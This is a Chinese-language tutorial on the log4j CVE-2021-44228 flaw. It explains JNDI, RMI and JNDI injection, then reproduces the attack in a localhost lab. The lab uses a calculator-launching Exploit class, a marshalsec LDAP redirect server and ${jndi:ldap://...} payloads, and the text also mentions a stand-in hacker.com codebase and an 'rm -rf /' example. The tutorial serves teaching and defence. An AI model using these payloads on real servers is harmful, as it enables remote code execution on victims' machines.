# 1. log4j 漏洞简介

## 1.1 log4j 简介

log4j 是一个开源Java日志框架，提供多样化日志记录和输出功能。

1.x 版本的 log4j 在结构、性能上被 slf4j、logback 等新兴的日志框架超越，Apache 也因此对 log4j 进行了一次重构升级，发布了优化了结构、性能的 2.x 版本 log4j（又名 log4j2）。log4j2 借鉴了 slf4j 的结构设计，分为了两部分：log4j-api、log4j-core，前者仅提供接口，后者提供实现。包名分别为 org.apache.logging.log4j 和 org.apache.logging.log4j.core。

因为 log4j 的易用性，众多以 Java 作为后端服务语言的网络应用、软件都在使用 log4j 来记录日志。

## 1.2 CVE-2021-44228

CVE-2021-44228 能够实现 RCE 从而危害使用 log4j 来记录日志的 Java 服务器的安全。CVSS3.0（通用漏洞评分系统）评分 10.0 分、评级 critical。

该漏洞威胁等级高、影响面广泛、利用价值高、利用难度低，受到广泛关注。并且因为 log4j 的广泛应用，包括苹果、谷歌、百度、Steam 等在内的大型互联网企业的产品也都受到该漏洞的影响。

该漏洞由 JNDI 特性引起，通过 LDAP 等查找 JNDI 的方式没有做防护，所以造成潜在的 RCE。影响范围从 log4j 版本 2.0-beta9 开始到 2.15.0-rc1，并在 2.15.0-rc2 版本中将这一行为默认关闭，在 2.16.0 版本中完全移除。

# 2. log4j 漏洞原理

## 2.1 JNDI 简介

JNDI (Java Naming and Directory Interface) 是 Java 漏洞挖掘中绝对绕不开的核心概念，也是 Log4j2 等核弹级漏洞的万恶之源。

要理解 JNDI 需要知道 它是什么？有什么用？并且为什么危险？

### 2.1.1 JNDI 是什么？

JNDI 是 Java 的通讯录和寻物启事接口。

- 生活类比  
    想象你是一个大公司的员工（Java 程序）。你需要找“财务部经理”签字。你不需要记住经理的名字叫“张三”还是“李四”，也不需要知道他住在哪里。你只需要拨打公司的总机（JNDI），说：“帮我接财务部经理（Name）”。总机就会帮你转接到那个人（Object）。

- 技术定义  
    JNDI 提供了一组 API，允许客户端通过一个名称（Name） 去查找和发现数据或对象（Object）。它底层支持多种协议（就像总机可以接通内线、外线、卫星电话一样）。

### 2.1.2 JNDI 如何工作？

JNDI 不是一种独立的协议，而是一个接口层 (API)。它的后端可以对接各种目录服务。

核心架构如下：

- Java Application: 项目代码
- JNDI API: javax.naming.* 包，统一的调用接口
- SPI (Service Provider Interface): 插件层。JNDI 可以根据请求的协议，自动切换后端驱动
- Service Providers: 具体的服务实现，常见的有：
    - RMI: Java 远程方法调用
    - LDAP: 轻量级目录访问协议（常用，是攻击重灾区）
    - DNS: 域名解析
    - CORBA: 通用对象请求代理体系

JNDI 有两个关键动作：

- bind(name, object): 绑定。把一个对象起个名，存进去。（比如：把数据库连接对象命名为 jdbc/MySQL 存入 JNDI）。
- lookup(name): 查找。根据名字把对象取出来。（比如：ctx.lookup("jdbc/MySQL")）。

### 2.1.3 JNDI 为什么会这么危险？

JNDI 之所以危险，是因为它太“智能”了。它有一个动态加载远程代码的机制，这原本是为了方便分布式计算，结果成了黑客的后门。

#### 1. 致命机制：JNDI Reference 与 Codebase
如果 JNDI 服务器（比如 LDAP）里存的不是一个直接的对象，而是一个 **Reference（引用）**，会发生什么？

*   **场景**：你要找 `FinanceManager` 对象。
*   **LDAP 服务器回答**：“我这里没有这个对象，但我有一张**小纸条（Reference）**。纸条上写着：这个对象属于 `EvilClass` 类，我这里没有代码，你去 `http://hacker.com/` 这个地址（Codebase）下载代码并自己实例化吧。”
*   **受害者 JVM 的反应**：JNDI 客户端发现这只是个引用，并且本地没有 `EvilClass`，它会**听话地**去 `http://hacker.com/EvilClass.class` 下载字节码，并在本地**加载并运行**。

#### 2. JNDI 注入攻击流程 (JNDI Injection)

这就是 Log4j2 和 Fastjson 漏洞的核心逻辑：

1.  **攻击者**：在输入框（或日志内容）里填入恶意字符串：
    `${jndi:ldap://127.0.0.1:1389/Exploit}`
2.  **受害者 (Server)**：
    *   代码调用了 `Context.lookup("ldap://127.0.0.1:1389/Exploit")`。
    *   JNDI 接口根据前缀 `ldap://`，自动切换到 LDAP 驱动，去连接攻击者的服务器。
3.  **攻击者服务器 (LDAP Server)**：
    *   返回一个恶意的 **Reference** 对象。
    *   指定 `factoryCodeLocation = "http://hacker-ip/"`。
    *   指定 `factoryClass = "Exploit"`。
4.  **受害者 (Server)**：
    *   收到 Reference，发现本地没有 `Exploit` 类。
    *   请求 `http://hacker-ip/Exploit.class`。
    *   **下载并执行** `Exploit` 类的构造函数或静态代码块 (`static {}`)。
    *   **BOOM!** 攻击者在静态代码块里写的 `Runtime.exec("rm -rf /")` 被执行。

#### 3. 为什么 Log4j2 那么惨？

Log4j2 为了灵活，允许在日志里使用占位符 `${}`。它内置了一个 `StrSubstitutor`，看到 `${jndi:...}` 就会自动提取 URL 并去执行 `lookup()`。
这意味着攻击者不需要控制代码逻辑，只要能让你打印一行日志（比如 User-Agent，或者聊天框输入），就能触发 JNDI 注入。

---

### 2.1.4 JNDI的防御现状

**JNDI 是什么？**
它是 Java 里的“万能寻物代理”。

**为什么有漏洞？**
因为这个代理太听话了，如果找不到东西，它会根据指引去互联网上下载不明代码并运行。

**现在还能用吗？**
自从这个机制被滥用后，Oracle 在高版本的 JDK 中加了限制：
*   **JDK 8u121+**: 默认禁止 RMI 远程加载代码 (`trustURLCodebase=false`)。
*   **JDK 8u191+**: 默认禁止 LDAP 远程加载代码。

**高版本 JDK 就安全了吗？**
不完全是。虽然不能直接下载远程 Class 了，但攻击者转向了 **利用本地 Class (Local Gadget)**。
*   **思路**：我不让你下载远程代码，但我让你去利用本地已经存在的类（比如 Tomcat 里的 `BeanFactory`），通过精心构造的 Reference 参数，让这些本地类帮我干坏事（比如加载内存马）。


## 2.2 RMI 简介

RMI (Remote Method Invocation)，中文叫 “远程方法调用”。

- 存根和骨架
    - 存根（Stub）：与 Client 端相连，是远程对象的代理；
    - 骨架（Skeleton）：与 Server 端相连，代理调用方法；
- 远程引用层（Remote Reference Layer）：用来寻找通信对象以及通过 RMI Registry 提供命名服务
- 传输层（Transport Layer）：在 Server 与 Client 端建立 socket 通信

任务流程：

任务输入 -> 呼叫本地替身(Stub) -> [网络传输] -> 呼叫服务器助手(Skeleton) -> 服务器真身干活 -> 结果原路返回。

Server 端开启 RMI 服务时先创建远程对象，然后向 registry 注册远程对象，等待调用。Client 端进行 RMI 时访问 registry 得到远程对象的存根，再通过存根远程调用方法，存根序列化调用后与骨架通信使骨架代理调用方法并将结果返回给存根再反序列化交给客户端。

JNDI 作为“电话簿”，而 RMI 就是“电话线路”。

需要先通过 JNDI 查到服务器上那个对象的“号码”（引用）。然后通过 RMI 拨通电话，进行远程操作。

安全风险：RMI 严重依赖 Java 序列化（把对象变成二进制流传输）。如果服务器那边传回来一个“炸弹对象”（恶意序列化数据），客户端一解包（反序列化），就会爆炸（RCE）。

## 2.3 JNDI注入原理 

JNDI 封装了一些服务，并且通过 lookup 来访问服务，例如通过 lookup("rmi://ip:port/...") 的形式访问 ip:port 提供的 RMI 服务，通过 lookup("ldap://ip:port/...") 的形式访问 LDAP 服务。

JNDI 的目的是通过名称 / 目录获取对象，而远程读取的一般是编译后的 .class 文件所以在 lookup 时会进行类加载，JVM 将其加载为 Java 类。而当 ClassLoader 加载 .class 文件的时候会调用类的静态方法，执行类的静态代码。因此如果可以控制 JNDI lookup 的 URL，便可以任意加载远程类，执行恶意代码，这也就是 JNDI 注入原理。

但是 JNDI 注入受到 JDK 配置限制，如果 com.sun.jndi.xxx.object.trustURLCodebase 这一配置是 false 时则不会信任 URL 从而无法进行 JNDI 注入。在 JDK 11.0.1、8u191、7u201、6u211 等版本中这一配置默认是 true，而从 6u132、7u122、8u113 开始，这一配置默认为 false（因此后面使用高版本 JDK 复现时要手动开启这一配置）

## 2.4 CVE-2021-44228 漏洞原理

CVE-2021-44228 即是通过 log4j 来实现了 JNDI 注入。log4j 可以通过 ${} 语法来获取动态内容并输出到日志中，其中对于每个 ${} 部分使用 lookup 方法来解决变量，其中也提供了 JndiLookup，也就是说可以使用 JNDI 来读取内容，形如 ${jndi:...}。这时就存在 JNDI 注入。

而大部分使用 log4j 来记录日志的网络应用都会记录用户的输入，比如搜索网站会记录用户搜索的内容，这时如果用户输入的是 ${jndi:...}（比如 ${jndi:ldap://ip:port/...}） 就会进行 JndiLookup，实现 JNDI 注入，这也就是 CVE-2021-44228 这个漏洞的原理。

# 3. log4j 漏洞复现

通过调用 LDAP 和 RMI 服务来复现 JNDI 注入漏洞。

## 3.1 LDAP 实现

进行漏洞复现需要两部分：
- 一个 LDAP 服务，用来重定向提供攻击类
    - 需要一个网络服务来提供攻击的 class 文件
- 一个包含存在漏洞的 log4j 组件的 Java 应用

### 3.1.1 攻击类

首先是用于发起攻击的 Exploit 类，代码如下：

```java
public class Exploit {
    static {
        try {
            String[] cmds = {"open", "/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

使用 javac Exploit.java 将这个类编译为 .class 类文件，然后使用 python -m http.server 8888 为当前目录在 8888 端口开启一个 HTTP 服务。可以通过 curl -I 127.0.0.1:8888/Exploit.class 来检查是否正常部署，能否获取到当前 Exploit 类文件。

### 3.1.2 LDAP 服务

使用 marshalsec 提供的工具来直接搭建 LDAP 服务

```bash
git clone https://github.com/mbechler/marshalsec.git

cd marshalsec

mvn clean package -DskipTests # 通过 maven 构建

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
    marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

下载源码，进入下载目录，使用 Maven 编译源码并打包成 jar 文件，因为 marshalsec 是开源代码，需要编译成 Java 可执行的 Jar 包才能运行。-DskipTests 是为了跳过单元测试，节省时间并避免因环境问题导致的编译失败。

然后启动了一个恶意的 LDAP 服务，充当一个“坏心眼的指路人”：

#### 参数详解：

1.  **`marshalsec.jndi.LDAPRefServer`**：
    *   这是告诉 Java：我要启动的功能是 **LDAP Reference Server**（LDAP 引用服务）。
    *   **默认端口**：这个服务默认监听在 **1389** 端口。

2.  **`"http://127.0.0.1:8888/#Exploit"`**：
    *   这是攻击者设置的**重定向地址**（即恶意代码的下载源，Codebase）。
    *   它是两部分的组合：
        *   `http://127.0.0.1:8888/`：**仓库地址**。意味着你必须在本地 8888 端口开启一个 HTTP 服务（通常用 `python -m http.server 8888`），并且把编译好的 `Exploit.class` 放在那里。
        *   `#Exploit`：**类名**。告诉受害者，去仓库里下载一个叫 `Exploit.class` 的文件，并在本地加载它。

这个 LDAP 服务直接提供了对 8888 端口中的 Exploit 类文件的重定向访问，端口在默认的 1389，当终端显示 "Listening on 0.0.0.0:1389"。此时，这个“陷阱”就架设好了。

接下来的流程是：

1. 攻击者向受害者发送 Payload：${jndi:ldap://指定IP:1389/abc}；
2. 受害者发出请求，受害者的服务器会主动去连接指定 IP 的1389端口，就是刚刚搭建的 marshalsec 服务的1389端口；
3. marshalsec 服务收到请求后，会返回一个 JNDI Reference 引用，给其转到 Exp 的下载地址，形象比喻：“你要找的对象我这里没有。但是，你可以去 http://127.0.0.1:8888/ 下载那个叫 Exploit 的类，它就是你要找的人。”；
4. 受害者中招，受害者收到指引，转身去连接 8888 端口的 HTTP 服务，下载 Exploit.class，然后在自己的内存里实例化它，直到 Exp 被执行。

### 3.1.3 log4j 漏洞应用

编写一个只调用了 log4j 记录 ${jndi:ldap://127.0.0.1:1389/Exploit} 的类（这个 payload 一般是由用户输入获取的，但这里方便复现直接硬编码到漏洞应用中了，二者本质是一样的），代码如下：
```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}
```





```java

```